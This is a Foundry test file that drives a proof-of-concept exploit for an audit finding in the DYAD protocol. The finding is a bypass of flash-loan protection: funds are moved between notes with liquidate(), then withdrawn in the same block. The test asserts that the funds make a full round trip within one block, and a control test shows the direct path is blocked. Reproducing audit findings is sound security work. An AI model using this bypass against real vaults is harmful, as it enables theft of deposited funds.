// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./33466-h-10-flash-loan-protection-mechanism-can-be-bypassed-via-sel.sol";

/*//////////////////////////////////////////////////////////////////////////
    DYAD [H-10] — flash loan protection bypassed via self-liquidation.

    Driver test for the cheatcode-free synthetic. Deploys the Exploit (which
    wires the reduced Vault/VaultManagerV2 system in its constructor), runs
    the attack sequence, and independently re-asserts the harm:
      * a direct same-block withdraw from the deposit note IS blocked
        (control -- the guard works normally),
      * a same-block withdraw from a note that received funds via
        liquidate()/move() is NOT blocked,
      * the flash-loaned funds make a full round trip within one block.
//////////////////////////////////////////////////////////////////////////*/
contract FlashLoanGuardBypassTest is Test {
    function test_selfLiquidation_bypassesFlashLoanGuard() public {
        Exploit exp = new Exploit();

        // === attack: deposit A -> blocked direct withdraw -> liquidate A->B -> withdraw B, same block ===
        exp.run();

        Vault vault = exp.vault();
        VaultManagerV2 manager = exp.manager();
        MockWeth weth = exp.weth();

        // HARM #1 — the flash-loaned funds are back in the attacker's hands,
        // within the SAME block they were deposited.
        assertEq(weth.balanceOf(address(exp)), exp.FLASH_AMOUNT(), "flashloaned funds fully recovered same-block");

        // HARM #2 — note B (the liquidation receiver) ends with zero
        // collateral: everything that arrived this block was withdrawn.
        assertEq(vault.balanceOf(exp.ID_B()), 0, "B fully drained same-block despite receiving funds this block");

        // Control re-verified independently: A's guard marker is exactly
        // this block (the direct path IS protected)...
        assertEq(manager.idToBlockOfLastDeposit(exp.ID_A()), block.number, "A's own guard marker is set correctly");
        // ...while B's marker was never refreshed by the liquidation move,
        // which is precisely the gap the bypass exploits.
        assertTrue(manager.idToBlockOfLastDeposit(exp.ID_B()) != block.number, "B's guard marker was never updated by liquidate()");
    }

    /// @notice Control: without ever routing funds through liquidate(),
    ///         a direct same-block deposit-then-withdraw on the SAME note is
    ///         correctly blocked -- confirming the guard functions normally
    ///         and the bug is specifically the liquidation-move gap.
    function test_control_directSameBlockWithdraw_isBlocked() public {
        MockWeth weth = new MockWeth();
        Vault vault = new Vault(address(0), weth);
        VaultManagerV2 manager = new VaultManagerV2(vault, weth);
        vault.setManager(address(manager));

        uint256 id = 7;
        weth.mint(address(this), 1 ether);
        manager.deposit(id, 1 ether);

        vm.expectRevert();
        manager.withdraw(id, 1 ether, address(this));
    }
}
